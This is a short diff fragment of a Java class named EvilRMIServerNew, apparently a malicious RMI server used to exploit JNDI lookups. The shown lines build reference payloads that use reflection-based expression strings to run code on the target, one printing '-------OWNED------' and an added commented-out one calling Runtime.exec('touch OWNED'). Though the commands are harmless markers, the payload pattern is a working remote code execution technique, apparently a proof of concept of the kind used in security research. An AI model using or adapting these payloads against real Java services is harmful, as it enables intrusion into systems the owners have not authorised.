@@ -38,6 +38,7 @@ public class EvilRMIServerNew {
         
         //works
         ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"java.lang.System\").getDeclaredField(\"out\").get(\"\".getClass().forName(\"java.lang.System\")).println(\"-------OWNED------\")"));
+        //ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch OWNED\")"));
 
         //ref.add(new StringRefAddr("foo", "this is foo string"));
  
